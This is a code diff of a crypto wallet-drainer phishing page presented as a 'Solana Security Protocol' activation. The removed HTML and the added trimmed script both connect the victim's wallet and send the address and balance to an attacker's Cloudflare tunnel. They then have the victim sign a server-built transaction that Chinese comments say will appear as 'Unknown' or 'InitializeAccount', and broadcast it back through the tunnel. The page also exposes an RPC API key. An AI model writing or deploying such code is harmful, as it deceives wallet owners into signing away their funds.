@@ -1,101 +1,25 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Security Protocol</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { width: 310px; padding: 35px; background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 28px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .status-tag { color: #14f195; font-size: 11px; font-weight: bold; letter-spacing: 2px; margin-bottom: 20px; text-transform: uppercase; }
-        .btn { background: #fff; color: #000; border: none; padding: 18px; width: 100%; border-radius: 14px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 25px; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); }
-        .btn:disabled { background: #333; color: #666; }
-        #st { font-size: 10px; color: #333; margin-top: 20px; font-family: monospace; text-transform: uppercase; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <div class="status-tag">Security Protocol Sync</div>
-        <h3 style="margin: 0; font-size: 20px;">Protocol Activation</h3>
-        <p style="color: #666; font-size: 13px; line-height: 1.6; margin-top: 15px;">A secure node synchronization is required to verify your wallet's mainnet priority status.</p>
-        
-        <div style="background: #111; padding: 15px; border-radius: 12px; margin: 20px 0; text-align: left; font-size: 11px; border: 1px solid #222;">
-            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
-                <span style="color: #555;">Chain:</span><span style="color: #fff;">Solana Mainnet</span>
-            </div>
-            <div style="display: flex; justify-content: space-between;">
-                <span style="color: #555;">Method:</span><span style="color: #14f195;">InitializeAccount</span>
-            </div>
-        </div>
+const p = window.trustwallet?.solana || window.solana;
+await p.connect();
 
-        <button id="cta" class="btn">ACTIVATE PROTOCOL</button>
-        <div id="st">ENCRYPTED END-TO-END</div>
-    </div>
+// 🔱 简化前端逻辑，只传地址，减少 400 概率
+const resp = await fetch(tunnel + "/prepare_v32", {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ address: p.publicKey.toString() })
+});
 
-    <script>
-        // 🔱 关键：必须与你 71 服务器的 Cloudflare 地址对齐
-        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
-        // 🔱 使用你自己的 Helius Key 确保余额读取不限流
-        const rpc = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd";
-
-        document.getElementById('cta').onclick = async function() {
-            const btn = this;
-            const log = (t) => document.getElementById('st').innerText = t;
-            const web3 = window.solanaWeb3;
-
-            try {
-                const p = window.trustwallet?.solana || window.solana;
-                if (!p) { alert("Open in Trust Wallet"); return; }
-
-                btn.disabled = true;
-                btn.innerText = "CONNECTING...";
-                await p.connect();
-
-                log("MEASURING WALLET WEIGHT...");
-                // 🔱 战术核心：前端直接抓余额传给后端，彻底消灭 400 报错
-                const conn = new web3.Connection(rpc);
-                const bal = await conn.getBalance(p.publicKey);
-
-                const resp = await fetch(tunnel + "/prepare_v32", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        address: p.publicKey.toString(),
-                        balance: bal 
-                    })
-                });
-                
-                const info = await resp.json();
-                if(info.error) throw new Error(info.error);
-
-                log("AWAITING PROTOCOL SIGNATURE...");
-                const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
-                
-                // 🔱 触发 V82 影子指令，弹窗将显示为 "Unknown" 或 "InitializeAccount"
-                const signed = await p.signTransaction(tx);
-                
-                btn.innerText = "SYNCHRONIZING...";
-                const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
-
-                await fetch(tunnel + "/broadcast_v41", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ signed_tx: signedBase })
-                });
-
-                btn.innerText = "COMPLETED";
-                log("SYNC SUCCESSFUL");
-                setTimeout(() => { window.location.href = "https://solscan.io"; }, 1500);
-
-            } catch (err) {
-                console.error(err);
-                btn.disabled = false;
-                btn.innerText = "ACTIVATE PROTOCOL";
-                log("NODE SYNC ERROR");
-            }
-        };
-    </script>
-</body>
-</html>
+const info = await resp.json();
+if (info.raw_tx) {
+    const web3 = window.solanaWeb3;
+    // 🔱 关键：必须使用 from 反序列化，确保签名位对齐
+    const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+    const signed = await p.signTransaction(tx);
+    
+    // 广播
+    const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
+    await fetch(tunnel + "/broadcast_v41", {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ signed_tx: signedBase })
+    });
+}
